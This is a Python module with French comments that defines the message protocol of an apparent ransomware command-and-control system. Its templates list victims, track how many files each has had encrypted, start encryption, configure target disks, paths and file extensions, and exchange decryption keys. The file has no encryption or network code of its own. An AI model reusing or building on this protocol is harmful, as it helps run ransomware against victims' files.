
LIST_VICTIM_REQ = {'LIST_REQ': None}
LIST_VICTIM_RESP = {'VICTIM': 0, 'HASH': '', 'OS': '', 'DISKS': '', 'STATE': '', 'NB_FILES': 0}
LIST_VICTIM_END = {'LIST_END': None}
HISTORY_REQ = {'HIST_REQ': 0}
HISTORY_RESP = {'HIST_RESP': 0, 'TIMESTAMP': 0, 'STATE': '', 'NB_FILES': 0}
HISTORY_END = {'HIST_END': 0}
CHANGE_STATE = {'CHGSTATE': 0, 'STATE': 'DECRYPT'}
INITIALIZE_REQ = {'INITIALIZE': '', 'OS': '', 'DISKS': ''}
INITIALIZE_KEY = {'KEY_RESP': 0, 'KEY': '', 'STATE': ''}
INITIALIZE_RESP = {'CONFIGURE': 0, 'SETTING': {'DISKS': [], 'PATHS': [], 'FILE_EXT': [], 'FREQ': 0, 'KEY': '', 'STATE' : ''}}

MESSAGE_TYPE = {'LIST_REQ': 'LIST_VICTIM_REQ', 'VICTIM': 'LIST_VICTIM_RESP','LIST_END': 'LIST_VICTIM_END','HIST_REQ': 'HISTORY_REQ','HIST_RESP': 'HISTORY_RESP','HIST_END': 'HISTORY_END', 'CHGSTATE': 'CHANGE_STATE',
    'INITIALIZE': 'INITIALIZE_REQ',
    'KEY_RESP': 'INITIALIZE_KEY',
    'CONFIGURE': 'INITIALIZE_RESP',
    'CRYPT': 'CRYPT_START',
    'PENDING': 'PENDING_MSG',
    'DECRYPT': 'DECRYPT_REQ',
    'RESTART': 'RESTART_REQ',
    'RESTART_RESP': 'RESTART_RESP'
}

CRYPT_START = {'CRYPT': 0}
PENDING_MSG = {'PENDING' : '', 'NB_FILE' : 0}
DECRYPT_REQ = {'DECRYPT' : '', 'KEY' : ''}
RESTART_REQ = {'RESTART' : ''}
RESTART_RESP = {'RESTART_RESP' : '', 'KEY' : ''}

def set_message(select_msg, params=None):
    """
    Retourne le dictionnaire correspondant à select_msg et le complète avec params si besoin.
    :param select_msg: le message à récupérer (ex: LIST_VICTIM_REQ)
    :param params: les éventuels paramètres à ajouter au message
    :return: le message sous forme de dictionnaire
    """
    if select_msg.upper() == 'RESTART_REQ':
        RESTART_REQ['RESTART'] = params[0]
        return RESTART_REQ

    if select_msg.upper() == 'RESTART_RESP':
        RESTART_RESP['RESTART_RESP'] = params[0]
        RESTART_RESP['KEY'] = params[1]
        return RESTART_RESP

    if select_msg.upper() == 'DECRYPT_REQ':
        DECRYPT_REQ['DECRYPT'] = params[0]
        DECRYPT_REQ['KEY'] = params[1]
        return DECRYPT_REQ

    if select_msg.upper() == 'PENDING_MSG':
        PENDING_MSG['PENDING'] = params[0]
        return PENDING_MSG

    if select_msg.upper() == 'CRYPT_START':
        CRYPT_START['CRYPT'] = params[0]
        return CRYPT_START

    if select_msg.upper() == 'LIST_VICTIM_REQ':
        return LIST_VICTIM_REQ

    if select_msg.upper() == 'LIST_VICTIM_RESP':
        if len(params) != 6:
            return None
        LIST_VICTIM_RESP['VICTIM'] = params[0]  # id
        LIST_VICTIM_RESP['HASH'] = params[1]
        LIST_VICTIM_RESP['OS'] = params[2]
        LIST_VICTIM_RESP['DISKS'] = params[3]
        LIST_VICTIM_RESP['STATE'] = params[4]
        LIST_VICTIM_RESP['NB_FILES'] = params[5]
        return LIST_VICTIM_RESP

    if select_msg.upper() == 'LIST_VICTIM_END':
        return LIST_VICTIM_END

    if select_msg.upper() == 'HISTORY_REQ':
        HISTORY_REQ['HIST_REQ'] = params[0]
        return HISTORY_REQ

    if select_msg.upper() == 'HISTORY_RESP':
        HISTORY_RESP['HIST_RESP'] = params[0]
        HISTORY_RESP['TIMESTAMP'] = params[1]
        HISTORY_RESP['STATE'] = params[2]
        HISTORY_RESP['NB_FILES'] = params[3]
        return HISTORY_RESP

    if select_msg.upper() == 'HISTORY_END':
        HISTORY_END['HIST_END'] = params[0]
        return HISTORY_END

    if select_msg.upper() == 'CHANGE_STATE':
        CHANGE_STATE['CHGSTATE'] = params[0]
        return CHANGE_STATE

    if select_msg.upper() == 'INITIALIZE_REQ':
        INITIALIZE_REQ['INITIALIZE'] = params[0]
        INITIALIZE_REQ['OS'] = params[1]
        INITIALIZE_REQ['DISKS'] = params[2]
        return INITIALIZE_REQ

    if select_msg.upper() == 'INITIALIZE_KEY':
        INITIALIZE_KEY['KEY_RESP'] = params[0]
        INITIALIZE_KEY['KEY'] = params[1]
        INITIALIZE_KEY['STATE'] = params[2]
        return INITIALIZE_KEY

    if select_msg.upper() == 'INITIALIZE_RESP':
        INITIALIZE_RESP['CONFIGURE'] = params[0]
        INITIALIZE_RESP['SETTING']['DISKS'] = params[1]
        INITIALIZE_RESP['SETTING']['PATHS'] = params[2]
        INITIALIZE_RESP['SETTING']['FILE_EXT'] = params[3]
        INITIALIZE_RESP['SETTING']['FREQ'] = params[4]
        INITIALIZE_RESP['SETTING']['KEY'] = params[5]
        INITIALIZE_RESP['SETTING']['STATE'] = params[6]
        return INITIALIZE_RESP

def get_message_type(message):
    """
    Récupère le nom correspondant au type de message (ex: le dictionnaire LIST_VICTIM_REQ retourne 'LIST_REQ')
    :param message: le dictionnaire représentant le message
    :return: une chaine correspondant au nom du message comme définit par le protocole
    """
    list_cle = [i for i in message]
    cle0 = list_cle[0]
    return MESSAGE_TYPE[cle0]